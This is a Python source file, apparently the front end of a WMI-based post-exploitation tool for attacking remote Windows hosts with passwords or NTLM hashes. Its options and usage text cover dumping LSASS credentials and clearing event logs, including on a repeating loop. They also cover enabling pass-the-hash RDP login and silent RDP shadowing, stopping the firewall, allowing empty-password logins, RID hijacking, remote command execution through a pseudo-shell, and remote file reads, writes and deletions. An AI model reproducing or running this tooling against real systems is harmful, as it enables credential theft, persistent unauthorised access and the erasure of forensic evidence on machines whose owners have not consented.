import module.userquery
import module.getProcessList
import module.rdpsetting
import module.enable_pth_login_rdp
import module.winrm_enable
import module.FirewallRule_setting
import module.Firewall_setting
import module.vbsrun
import module.cmdrun
import module.cmdrun2
import module.clearEventLog
import module.dumpLsass
import module.files
import module.listdir
import module.ridhijack
import threading
import logging
import sys
import re
import time
from io import StringIO
import optparse
import colorama


def getProcessList(ip='', username='', password='',domain='',hashes='',aesKey='',query=False):
    module.getProcessList.getProcessList(ip, username, password,domain,hashes,aesKey,query)


def userquery(ip='', username='', password='',domain='',hashes='',aesKey=''):
    module.userquery.userquery(ip, username, password,domain,hashes,aesKey)

def enablerdp(ip='', username='', password='',domain='',hashes='',aesKey='',isenable=0):
    module.rdpsetting.enablerdp(ip, username, password,domain,hashes,aesKey,isenable)

def enable_pth_login_rdp(ip='', username='', password='',domain='',hashes='',aesKey='',isenable=0):
    module.enable_pth_login_rdp.enable_pth_login_rdp(ip, username, password,domain,hashes,aesKey,isenable)

def winrm_enable(ip='', username='', password='',domain='',hashes='',aesKey='',isenable=0):
    module.winrm_enable.winrm_enable(ip, username, password,domain,hashes,aesKey,isenable)

def FirewallRule_setting(ip='', username='', password='',domain='',hashes='',aesKey='',arg=""):
    module.FirewallRule_setting.FirewallRule_setting(ip, username, password,domain,hashes,aesKey,arg)

def Firewall_setting(ip='', username='', password='',domain='',hashes='',aesKey='',arg=""):
    module.Firewall_setting.Firewall_setting(ip, username, password,domain,hashes,aesKey,arg)

def vbsrun(ip='', username='', password='',domain='',hashes='',aesKey='',vbsname=''):
    module.vbsrun.run_vbs(ip, username, password, domain, hashes, aesKey, vbsname)

def stopvbs(ip='', username='', password='',domain='',hashes='',aesKey='',vbsid=''):
    if vbsid=="1" or vbsid=='':
        id="Example"
    else:
        id=vbsid
    module.vbsrun.delete(ip, username, password, domain, hashes, aesKey,id)

def execute_command(ip='', username='', password='',domain='',hashes='',aesKey='',cmd=''):
    t=threading.Thread(target=module.cmdrun.exec_command,args=(ip, username, password, domain, hashes, aesKey,cmd))
    t.setDaemon(True)
    t.start()
    t.join(300) #timeout 300s
    #module.cmdrun.exec_command(ip, username, password, domain, hashes, aesKey,cmd)

def clear_eventlog(ip='', username='', password='',domain='',hashes='',aesKey='',logname='',id=''):
    module.clearEventLog.clear(ip, username, password, domain, hashes, aesKey,logname,id=id)

def dump_lsass(ip='', username='', password='',domain='',hashes='',aesKey=''):
    module.dumpLsass.dump_lsass(ip, username, password, domain, hashes, aesKey)

def cmdrun2(ip='', username='', password='',domain='',hashes='',aesKey='',cmd=''):
    module.cmdrun2.execcmd(ip, username, password, domain, hashes, aesKey,cmd)

def fake_shell(ip='', username='', password='',domain='',hashes='',aesKey=''):
    import base64
    print("[*] connect IP:{} fakeshell".format(ip))
    current_path="C:\\Windows\\System32"
    tmp_path="C:\\Windows\\System32" #命令结果报错时记录上一次成功命令的当前路径
    while True:
        user_cmd=input("{}>".format(current_path))
        if user_cmd=="exit":
            break
        current=sys.stdout
        sys.stdout = StringIO()
        execute_result=module.cmdrun2.execcmd(ip, username, password, domain, hashes, aesKey, user_cmd,"fake_shell",current_path)
        sys.stdout = current
       # print(execute_result)
        cmdresult=execute_result.split("\n")

        #防止下标错误获取不到正确路径
        try:
            current_path=cmdresult[-3].rstrip("\r")
            if ":" and "\\" not in current_path:
                current_path=tmp_path
            else:
                tmp_path=current_path
                current_path=current_path
        except:
            current_path = current_path
        tmptxt=execute_result.find("[S]")
        print(execute_result[0:tmptxt]+"\r\n")

def writeFile(ip='', username='', password='',domain='',hashes='',aesKey='',targetfile='',savetofile=''):
    module.files.WriteFile(ip, username, password, domain, hashes, aesKey,targetfile,savetofile)

def readfile(ip='', username='', password='',domain='',hashes='',aesKey='',targetfile='',savetofile=''):
    module.files.readfile(ip, username, password, domain, hashes, aesKey,targetfile,savetofile)

def lsdirpath(ip='', username='', password='',domain='',hashes='',aesKey='',targetpath=''):
    module.listdir.ls(ip, username, password, domain, hashes, aesKey,targetpath)

def deletefile(ip='', username='', password='',domain='',hashes='',aesKey='',targetfile=''):
    module.files.deletefile(ip, username, password, domain, hashes, aesKey,targetfile)

def rdpshadowset(ip='', username='', password='',domain='',hashes='',aesKey='',shadowid=0):
    module.rdpsetting.rdpshadow(ip, username, password, domain, hashes, aesKey,int(shadowid))

def rdpnulllogin(ip='', username='', password='',domain='',hashes='',aesKey='',isenable=0):
    module.rdpsetting.Login_with_empty_password(ip, username, password, domain, hashes, aesKey,int(isenable))

def user_rid_query(ip='', username='', password='',domain='',hashes='',aesKey=''):
    module.userquery.user_rid_query(ip, username, password, domain, hashes, aesKey)

def ridhijack(ip='', username='', password='',domain='',hashes='',aesKey='',ridlist=""):
    module.ridhijack.run(ip, username, password, domain, hashes, aesKey,ridlist)

def set_user(ip='', username='', password='',domain='',hashes='',aesKey='',ridlist=""):
    module.ridhijack.user_set(ip, username, password, domain, hashes, aesKey,ridlist)


if __name__ == '__main__':
    parser=optparse.OptionParser()
    parser.add_option("-i",dest="ip",help="target IP")
    parser.add_option("-u",dest="username",help="auth username")
    parser.add_option("-d",dest="domain",help="target domain")
    parser.add_option("-p",dest="password",help="auth password")
    parser.add_option("-n",dest="ntlm",help="auth ntlm/lm")
    parser.add_option("-g",dest="get_process",action='store_true',help="get process list")
    parser.add_option("-q",dest="process_query",action='store_true',help="query Av/EDR/Process")
    parser.add_option("-U",dest="user_query",action='store_true',help="user list query")
    parser.add_option("-R",dest="enable_rdp",help="enable rdp/disable rdp")
    parser.add_option("-E",dest="enable_pth",help="enable rdp pth login")
    parser.add_option("-W",dest="enable_winrm",help="enable winrm service")
    parser.add_option("-F",dest="netfirewallrule",help="Query/Enable/Disable NetFirewallRule")
    parser.add_option("-f",dest="firewall",help="Start/Stop firewall")
    parser.add_option("-V",dest="vbs",help="Run vbs")
    parser.add_option("--stop_vbs",action="store",dest="stop_vbs",help="stop Default vbs  Runing or Stop the id of vbs running")
    parser.add_option("--one_vbs_run",dest="one_vbs_run",help="vbs that only runs once")
    parser.add_option("--execute_command",dest="execute_command",help="execute command (NT 6.0)")
    parser.add_option("--execute_command2",dest="execute_command2",help="execute command")
    parser.add_option("--clear_eventlog",dest="clear_eventlog",help="clear event log")
    parser.add_option("--cycle_clear",action="store_true",dest="cycle_clear",help="cycle clear eventlog")
    parser.add_option("--shell",action="store_true",dest="exec2_fake_shell",help="fake shell")
    parser.add_option("--writefile",dest="writefile",help="write file")
    parser.add_option("--readfile",dest="readfile",help="read file")
    parser.add_option("--save-to-file",dest="outfile",help="write file save as path")
    parser.add_option("--ls",dest="lsdir",help="Query files and folders of a certain path")
    parser.add_option("--dele-file",dest="deletefile",help="remove file")
    parser.add_option("--rdp-shadow",dest="rdpshadow",help="rdp shadow setting (-1-Delete Shadow reg key,0-No remote control allowed,1-Full Control with User Rights,2-Full control without user permission,3-View sessions with user permissions,4-View conversations without user permission)")
    parser.add_option("--nulllogin",dest="nonelogin",help="Login with empty password")
    parser.add_option("--user-rid-query",action="store_true",dest="rid_query",help="Users RID Query")
    parser.add_option("--ridhijack",dest="rdihijack",help="RID hijack (--ridhijack <src_user_rid>,<target_user_rid>)")
    parser.add_option("--set-user",dest="setuser",help="Enable/Disable User(--setuser <rid>,1/0)")
    (option,args)=parser.parse_args()
    ip = option.ip
    if option.domain != None:
        domain = option.domain
    else:
        domain = ""
    username = option.username
    password = option.password
    #原本想优化一下这一堆if的，咕咕咕
    if option.ip and option.username and (option.password!=None or option.ntlm !=None) and (option.get_process or (option.get_process and option.process_query)):
        getProcessList(ip=ip, domain=domain,username=username, password=password,hashes=option.ntlm,query=option.process_query)
    elif  option.ip and option.username and (option.password!=None or option.ntlm !=None) and option.user_query:
        userquery(ip=ip, domain=domain, username=username, password=password,hashes=option.ntlm)
    elif option.ip and option.username and (option.password!=None or option.ntlm !=None) and option.enable_rdp:
        enablerdp(ip=ip, domain=domain, username=username, password=password, hashes=option.ntlm,isenable=option.enable_rdp)
    elif option.ip and option.username and (option.password!=None or option.ntlm !=None) and option.enable_pth:
        enable_pth_login_rdp(ip=ip, domain=domain, username=username, password=password, hashes=option.ntlm,isenable=option.enable_pth)
    elif option.ip and option.username and (option.password != None or option.ntlm != None) and option.enable_winrm:
        winrm_enable(ip=ip, domain=domain, username=username, password=password, hashes=option.ntlm,isenable=option.enable_winrm)
    elif option.ip and option.username and (option.password != None or option.ntlm != None) and option.netfirewallrule:
        FirewallRule_setting(ip=ip, domain=domain, username=username, password=password, hashes=option.ntlm,arg=option.netfirewallrule)
    elif option.ip and option.username and (option.password != None or option.ntlm != None) and option.firewall:
        Firewall_setting(ip=ip, domain=domain, username=username, password=password,hashes=option.ntlm,arg=option.firewall)
    elif option.ip and option.username and (option.password != None or option.ntlm != None) and option.vbs:
        vbsrun(ip=ip, domain=domain, username=username, password=password, hashes=option.ntlm,vbsname=option.vbs)
    elif option.ip and option.username and (option.password != None or option.ntlm != None) and option.stop_vbs:
        stopvbs(ip=ip, domain=domain, username=username, password=password,hashes=option.ntlm,vbsid=option.stop_vbs)
    elif option.ip and option.username and (option.password != None or option.ntlm != None) and option.one_vbs_run:
        vbsrun(ip=ip, domain=domain, username=username, password=password, hashes=option.ntlm,vbsname=option.one_vbs_run)
        time.sleep(2)
        stopvbs(ip=ip, domain=domain, username=username, password=password,hashes=option.ntlm)
    elif option.ip and option.username and (option.password != None or option.ntlm != None) and option.execute_command:
        execute_command(ip=ip, domain=domain, username=username, password=password, hashes=option.ntlm,cmd=option.execute_command)
    elif option.ip and option.username and (option.password != None or option.ntlm != None) and option.clear_eventlog:
        clear_eventlog(ip=ip, domain=domain, username=username, password=password,hashes=option.ntlm, logname=option.clear_eventlog,id=option.cycle_clear)
    elif option.ip and option.username and (option.password != None or option.ntlm != None) and option.execute_command2:
        cmdrun2(ip=ip, domain=domain, username=username, password=password, hashes=option.ntlm,cmd=option.execute_command2)
    elif option.ip and option.username and (option.password != None or option.ntlm != None) and option.exec2_fake_shell:
        fake_shell(ip=ip, domain=domain, username=username, password=password,hashes=option.ntlm)
    elif option.ip and option.username and (option.password != None or option.ntlm != None) and option.writefile and option.outfile:
        writeFile(ip=ip, domain=domain, username=username, password=password,hashes=option.ntlm,targetfile=option.writefile,savetofile=option.outfile)
    elif option.ip and option.username and (option.password != None or option.ntlm != None) and option.readfile and option.outfile:
        readfile(ip=ip, domain=domain, username=username, password=password,hashes=option.ntlm,targetfile=option.readfile,savetofile=option.outfile)
    elif option.ip and option.username and (option.password != None or option.ntlm != None) and option.lsdir:
        lsdirpath(ip=ip, domain=domain, username=username, password=password,hashes=option.ntlm,targetpath=option.lsdir)
    elif option.ip and option.username and (option.password != None or option.ntlm != None) and option.deletefile:
        deletefile(ip=ip, domain=domain, username=username, password=password,hashes=option.ntlm,targetfile=option.deletefile)
    elif option.ip and option.username and (option.password != None or option.ntlm != None) and option.rdpshadow:
        rdpshadowset(ip=ip, domain=domain, username=username, password=password,hashes=option.ntlm,shadowid=option.rdpshadow)
    elif option.ip and option.username and (option.password != None or option.ntlm != None) and option.nonelogin:
        rdpnulllogin(ip=ip, domain=domain, username=username, password=password,hashes=option.ntlm,isenable=option.nonelogin)
    elif option.ip and option.username and (option.password != None or option.ntlm != None) and option.rid_query:
        user_rid_query(ip=ip, domain=domain, username=username, password=password,hashes=option.ntlm)
    elif option.ip and option.username and (option.password != None or option.ntlm != None) and option.rdihijack:
        ridhijack(ip=ip, domain=domain, username=username, password=password,hashes=option.ntlm,ridlist=option.rdihijack)
    elif option.ip and option.username and (option.password != None or option.ntlm != None) and option.setuser:
        set_user(ip=ip, domain=domain, username=username, password=password,hashes=option.ntlm,ridlist=option.setuser)
    else:
        print("Usage:\npython wmi_query -i <target> -u <username> -p <password> -g #Get Process List\n"
              "python wmi_query -i <target> -u <username> -p <password> -g -q #query Av/EDR/Process\n"
              "python wmi_query -i <target> -u <username> -p <password> -U #User Query\n"
              "python wmi_query -i <target> -u <username> -p <password> -R 1 #Enable rdp\n"
              "python wmi_query -i <target> -u <username> -p <password> -R 0 #Disable rdp\n"
              "python wmi_query -i <target> -u <username> -p <password> -R 2 #Query rdp Port\n"
              "python wmi_query -i <target> -u <username> -p <password> -E 1 #Enable PTH rdp\n"
              "python wmi_query -i <target> -u <username> -p <password> -E 0 #Disable PTH rdp\n"
              "python wmi_query -i <target> -u <username> -p <password> -W 1 #Enable winrm service\n"
              "python wmi_query -i <target> -u <username> -p <password> -F query # query all Firewall rule\n"
              "python wmi_query -i <target> -u <username> -p <password> -F query1 #query Enable Firewall rule\n"
              "python wmi_query -i <target> -u <username> -p <password> -F query2 #query Disable Firewall rule\n"
              "python wmi_query -i <target> -u <username> -p <password> -F querya #query inbound Firewall rule\n"
              "python wmi_query -i <target> -u <username> -p <password> -F queryb #query outbound Firewall rule\n"
              "python wmi_query -i <target> -u <username> -p <password> -F query1a #query Enable inbound Firewall rule\n"
              "python wmi_query -i <target> -u <username> -p <password> -F query2a #query Disable inbound Firewall rule\n"
              "python wmi_query -i <target> -u <username> -p <password> -F query1b #query Enable outbound Firewall rule\n"
              "python wmi_query -i <target> -u <username> -p <password> -F query2b #query Disable outbound Firewall rule\n"
              "python wmi_query -i <target> -u <username> -p <password> -F query3 #query InstanceID Firewall rule\n"
              "python wmi_query -i <target> -u <username> -p <password> -F delete #delete InstanceID Firewall rule\n"
              "python wmi_query -i <target> -u <username> -p <password> -F disable #Disable a firewall rule\n"
              "python wmi_query -i <target> -u <username> -p <password> -F enable #Enable a firewall rule\n"
              "python wmi_query -i <target> -u <username> -p <password> -f query #query Firewall\n"
              "python wmi_query -i <target> -u <username> -p <password> -f stop #stop Firewall\n"
              "python wmi_query -i <target> -u <username> -p <password> -F start #start Firewall\n"
              "python wmi_query -i <target> -u <username> -p <password> -V <vbs_path> #(vbs_id:Example) Run Vbs (The vbs is run repeatedly at intervals of 2 seconds, and the --stop_vbs parameter must be used to stop)\n"
              "python wmi_query -i <target> -u <username> -p <password> --stop_vbs <vbs_id>/--stop_vbs 1 #-- stop 1 stop default(vbsid:Example) vbs running on repeat/stop use --stop <uuid>\n"
              "python wmi_query -i <target> -u <username> -p <password> --one_vbs <vbs_path> #vbs that only runs once\n"
              "python wmi_query -i <target> -u <username> -p <password> --execute_command <command> #To execute the command through Win32_ScheduledJob (NT 6.0), you need to wait for 1 minute\n"
              "python wmi_query -i <target> -u <username> -p <password> --clear_eventlog #cear eventlog logName:appllication,system,setup,forwardedevents,security\n"
              "python wmi_query -i <target> -u <username> -p <password> --clear_eventlog --cycle_clear# This will execute clear EventLog vbs forever(To stop use --stop <uuid>)"
              "python wmi_query -i <target> -u <username> -p <password> --execute_command2 <command> #execute command\n"
              "python wmi_query -i <target> -u <username> -p <password> --shell #Command execution mode 2 to get a fake shell\n"
              "python wmi_query -i <target> -u <username> -p <password> --writefile <file_path> --save-to-file <save_file_path># remote file writing\n"
              "python wmi_query -i <target> -u <username> -p <password> --readfile <target_file_path> --save-to-file <save_file_path># remote file reading\n"
              "python wmi_query -i <target> -u <username> -p <password> --ls <target_file_path> #Query files and folders of a certain path\n"
              "python wmi_query -i <target> -u <username> -p <password> --rdp-shadow <shadow_id> #Rdp Shadow Setting\n"
              "python wmi_query -i <target> -u <username> -p <password> --nulllogin 0 #Enable null password login\n"
              "python wmi_query -i <target> -u <username> -p <password> --nulllogin 0 #Disable null password login\n"
              "python wmi_query -i <target> -u <username> -p <password> --user-rid-query #Users RID Query\n"
              "python wmi_query -i <target> -u <username> -p <password> --ridhijack 1f5(src_id),1f4(target_rid) #Rid Hijack Example\n"
              "python wmi_query -i <target> -u <username> -p <password> --set-user <rid>,0 #Disable User\n"
              "python wmi_query -i <target> -u <username> -p <password> --set-user <rid>,1 #Enable User")
        parser.print_help()